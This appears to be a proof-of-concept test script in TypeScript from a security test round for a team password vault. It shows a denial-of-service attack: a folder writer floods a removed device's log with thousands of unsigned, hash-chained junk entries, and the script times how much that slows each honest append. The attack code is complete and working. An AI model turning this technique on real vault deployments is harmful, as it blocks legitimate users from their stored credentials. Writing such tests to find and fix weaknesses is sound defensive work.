// @ts-nocheck PoC script, run as is by the round-5 tests
// T1b: through the real VaultStore (temp team folder). A folder writer appends unsigned junk,
// chained by prev, to the log of a removed device (it never writes again, so nothing replaces
// the junk). Every later vault.append pays one signature check per junk line, warm.
// PASS = the attack step worked.
import { addDevice, build, check, dev, entry, found, now, open, random, rec, st } from './lib';
import { tempStore } from './agentlib';
const N = Number(process.argv[2] ?? 20000);
const T = tempStore('t1b');
try {
  const A = dev(), B = dev(), X = dev();
  const v = found(A, 'team');
  const id = v.vaultId;
  addDevice(id, v.logs, A, B, 'admin');
  addDevice(id, v.logs, A, X, 'member');
  let s = st(id, v.logs);
  const rem = build.buildDeviceRemove(s, A, { device: X.deviceId, currentKey: open.openVault(s, A).currentKey, random, time: now() });
  v.logs[A.deviceId]!.push(entry.serializeEntry(rem.entry));
  s = st(id, v.logs);
  console.log('X removed:', s.members[X.deviceId].removed);
  const real = build.buildAccountPut(s, B, { account: build.newAccountId(random), record: rec(), currentKey: open.openVault(s, B).currentKey, random, time: now() });
  const xl = [...v.logs[X.deviceId]!];
  let prev = entry.entryHash(JSON.parse(xl[xl.length - 1]!));
  for (let i = 0; i < N; i++) {
    const e: any = { ...real, author: X.deviceId, seq: xl.length, prev, sig: 'A'.repeat(86), time: real.time + i, seen: {} };
    xl.push(entry.serializeEntry(e)); prev = entry.entryHash(e);
  }
  T.writeFolder(id, { ...v.logs, [X.deviceId]: xl });
  let draft = s;
  let last = 0;
  for (let i = 0; i < 3; i++) {
    const put = build.buildAccountPut(draft, B, { account: build.newAccountId(random), record: rec(), currentKey: open.openVault(s, B).currentKey, random, time: now() });
    draft = build.afterOwnEntry(draft, put);
    const t = Date.now();
    T.store.append(id, [put], false);
    last = Date.now() - t;
    console.log(`B's account put #${i + 1}: ${last} ms`);
  }
  console.log('agent warnings:', T.warnings);
  check('every honest append takes over 1 s (warm) after junk on a removed device\'s log', last > 1000, `${last} ms`);
} finally { T.cleanup(); }
